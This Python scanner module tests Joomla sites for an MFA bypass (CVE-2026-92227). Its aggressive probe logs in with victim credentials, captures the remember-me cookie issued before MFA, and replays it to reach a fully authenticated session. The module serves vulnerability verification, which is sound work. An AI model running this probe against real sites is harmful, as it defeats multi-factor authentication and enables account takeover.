from __future__ import annotations

import re
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-92227"
NAME = "Joomla core MFA bypass through remember-me cookie"
COMPONENT = "Joomla core com_users"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["4.0.0-5.4.8", "6.0.0-6.1.3"]
AFFECTED_RULE = "Joomla 4.0.0-5.4.8 and 6.0.0-6.1.3; requires the victim password (PR:N/AT:P)"
FIXED_RULE = "Update to Joomla 5.4.9, 6.1.4, or newer"
LOGIN_PATH = "/index.php/component/users/login?Itemid=101"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("4.0.0") <= parsed < parse_version_required("5.4.9"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.4"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("4.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} is in the affected range; pre-MFA remember-me issuance "
            "must be verified live with a seeded MFA account."
        ),
        "PATCHED": f"Joomla {joomla_version} includes the post-MFA remember-me gate.",
        "NOT_AFFECTED": f"Joomla {joomla_version} is outside the affected range.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 5.4.9, 6.1.4, or newer and audit remember-me usage in authentication logs.",
    )


def _anon_token(client: HttpClient, base: str, timeout: int) -> str | None:
    response = client.get(f"{base}{LOGIN_PATH}", timeout=timeout)
    if response.get("status") != 200:
        return None
    match = re.search(r'name="([a-f0-9]{32})" value="1"', response.get("body", "") or "")
    return match.group(1) if match else None


def _remember_cookie_from_jar(client: HttpClient) -> tuple[str, str] | None:
    jar = getattr(client, "jar", None)
    if jar is None:
        return None
    for cookie in jar:
        if cookie.name.startswith("joomla_remember_me_"):
            return cookie.name, cookie.value
    return None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    victim_user: str | None = None,
    victim_password: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not victim_user or not victim_password:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{LOGIN_PATH}",
            detail="The probe needs victim credentials (--aggressive-arg victim_user=... victim_password=...); without the password nothing is sent.",
            action="Re-run with lab victim credentials on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    token = _anon_token(client, base, timeout)
    if not token:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{LOGIN_PATH}",
            detail="No anonymous login token was available, so the password login could not be attempted.",
            action="Verify the frontend login route is reachable.",
        )
    login = client.request(
        f"{base}/index.php?option=com_users&task=user.login",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "username": victim_user,
            "password": victim_password,
            "remember": "yes",
            "return": "",
            token: "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    remember = _remember_cookie_from_jar(client)
    evidence: dict[str, object] = {
        "cookie_issued_premfa": remember is not None,
        "session_authenticated": False,
        "mfa_gate_seen": False,
    }
    if remember is None:
        status = "PATCHED" if login.get("status") in (200, 303) else "NOT_CONFIRMED"
        return Finding(
            cve=CVE_ID, name=NAME, status=status,
            confidence="HIGH" if status == "PATCHED" else "MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/index.php?option=com_users&task=user.login",
            evidence=evidence,
            detail=(
                "The password login did not issue a remember-me cookie before MFA, "
                "consistent with the fixed post-MFA issuance."
                if status == "PATCHED"
                else "The password login did not complete as expected; no remember-me cookie was observed."
            ),
            action="No action is required if the target runs Joomla 5.4.9, 6.1.4, or newer.",
        )
    cookie_name, cookie_value = remember
    ghost = HttpClient(timeout=timeout, proxy=proxy)
    home = ghost.get(
        f"{base}/", timeout=timeout,
        headers={"Cookie": f"{cookie_name}={cookie_value}"},
    )
    body = home.get("body", "") or ""
    text = re.sub(r"<[^>]+>", " ", body)
    text = re.sub(r"\s+", " ", text)
    logged_in = ("Log out" in text or "logout" in text.lower()) and victim_user in text
    mfa_gate = bool(re.search(r"verification code|captive|Multi-factor Authentication", text, re.IGNORECASE))
    evidence["session_authenticated"] = logged_in
    evidence["mfa_gate_seen"] = mfa_gate
    if logged_in and not mfa_gate:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            evidence=evidence,
            detail=(
                f"A fresh session presenting only the pre-MFA remember-me cookie is fully authenticated as "
                f"{victim_user} with no MFA step performed (no TOTP was ever submitted). "
                "The premature cookie issuance bypasses multi-factor authentication."
            ),
            action="Upgrade to Joomla 5.4.9, 6.1.4, or newer; invalidate remember-me tokens and rotate the account password.",
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}/",
        evidence=evidence,
        detail=(
            "A remember-me cookie was issued and the cookie session reaches "
            f"{'the MFA captive gate' if mfa_gate else 'an unexpected page'} instead of a full session."
        ),
        action="Manually verify the MFA captive behavior on the target.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only password-login proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        victim_user=aggressive_value(aggressive_args, aggressive_command, "victim_user"),
        victim_password=aggressive_value(aggressive_args, aggressive_command, "victim_password"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-92227",
            "https://developer.joomla.org/security-centre/1094-20260914-core-mfa-authentication-bypass-through-rememberme-cookies.html",
        ],
    }
